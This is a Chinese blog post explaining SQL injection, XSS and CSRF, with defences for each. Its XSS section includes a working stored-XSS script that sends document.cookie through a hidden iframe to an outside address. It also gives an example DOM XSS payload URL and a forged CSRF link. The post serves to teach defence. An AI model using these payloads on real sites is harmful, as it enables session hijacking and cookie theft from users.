---
title: web安全
id: 20170828
tags:
  - web
  - 安全
  - sql注入
  - XSS
  - CSRF
categories:
  - 安全
  - sql注入
  - XSS
  - CSRF
date: 2017-08-28 03:36:45
---

##### 一、SQL注入

​    把SQL命令插入到web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意SQL命令。

​    SQL分为平台层注入和代码层注入。前者由不安全的数据库配置或者数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法查询

​    应对：

* 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双"-"进行转换等。
* 永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。
* 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。
* 不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。

##### 二、XSS(Cross-site scripting 跨站脚本攻击)

  XSS攻击指的是攻击者往web页面里插入而已html标签或者js代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点。

**分类**

1、反射型跨站脚本(Reflected Cross-site Scripting)。主要是将恶意脚本附加到URL地址的参数中，原理如下：发现存在反射XSS的URL——根据输出点的环境构造XSS代码——进行编码等迷惑手法——发送给受害人——受害打开后，执行XSS代码——完成攻击(获取cookies、url、浏览器信息、IP等)。反射型XSS的特点是只在用户单击时触发，且只执行一次，故也称作非持久型跨站。

2、持久型跨站脚本(Persistent Cross-site Scripting)。攻击者事先将恶意Javascript代码上传或储存到漏洞服务器上，只要受害者浏览包含此恶意代码的页面就会中招。一般出现在留言、评论等交互处。

```javascript
// 用 <script type="text/javascript"></script> 包起来放在评论中

(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```

3、DOM XSS。前面两种XSS一般出现在服务器端代码中，而DOM-Based XSS是基于DOM文档对象模型，受客户端浏览器代码的影响。这一漏洞的前提是，一个网页以不安全的方式使用document.location、document.URL、document.referrer等对象获取数据。
举个例子，有如下代码：

```html
<html>
<head>
<title>Welcome!</title>
</head>
<body>
  <p>Hi</p>
  <script>
    var pos=document.URL.indexOf("name=")+5;
    document.write(document.URL.substring(pos,document.URL.length));
  </script>
</body>
</html>
```

通常，这个欢迎网页的请求是这样的：

`http://www.test.com/welcome.html?name=lihua`

然而，如果这个请求是这样的：

`http://www.test.com/welcome.html?name=<script>alert(document.cookie)</script>`

这就导致了XSS，弹出了cookie。

**XSS防范方法**

* 代码里对用户输入的地方和变量都需要仔细检查长度和对”<”,”>”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。
* 避免直接在cookie 中泄露用户隐私，例如email、密码等等。
* 通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。
* 如果网站不需要再浏览器端对cookie 进行操作，可以在Set-Cookie 末尾加上HttpOnly 来防止javascript 代码直接获取cookie 。
* 尽量采用POST 而非GET 提交表单

##### 三、CSRF（Cross-site request forgery 跨站请求伪造）

也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。就是冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。

例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问： `http://example.com/bbs/create_post.php?title=标题&content=内容` 那么，我只需要在论坛中发一帖，包含一链接： `http://example.com/bbs/create_post.php?title=我是脑残&content=哈哈` 只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。

**方案**

* 改变API设计，对于发帖这一类创建资源操作，只接受POST请求，而GET请求应该只浏览而不改变服务器端资源，即restful api

* 通过“请求令牌”防御，“请求令牌”和“同步令牌”原理一样，只不过目的不同，前者为了保证请求一定来自预期的页面，后者为了解决POST请求重复提交问题；

  *实现原理：*

  服务器要以某种策略生成随机字符串，作为令牌（token），保存在session里，然后在发出请求的页面，把令牌以隐藏域一类的形式，与其他信息一并发出。在接受请求的页面，把接收到的信息中的令牌与session中的比较，只有一致的时候才处理，否则返回403或要求用户重新登陆验证身份

  **注意：**

  - 虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。如果全局使用一个 SessionKey，那么危险系数会上升。原则上来说，每个页面的请求令牌都应该放在独立的 Session Key中。我们在设计服务器端的时候，可以稍加封装，编写一个令牌工具包，将页面的标识作为 Session 中保存令牌的键。
  - 在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。
  - 第一点说了请求令牌理论上是可破解的，所以非常重要的场合，应该考虑使用验证码（令牌的一种升级，目前来看破解难度极大），或者要求用户再次输入密码（亚马逊、淘宝的做法）。但这两种方式用户体验都不好，所以需要产品开发者权衡。
  - 无论是普通的请求令牌还是验证码，服务器端验证过一定记得销毁。忘记销毁用过的令牌是个很低级但是杀伤力很大的错误。我们学校的选课系统就有这个问题，验证码用完并未销毁，故只要获取一次验证码图片，其中的验证码可以在多次请求中使用（只要不再次刷新验证码图片），一直用到Session 超时。这也是为何选课系统加了验证码，外挂软件升级一次之后仍然畅通无阻。

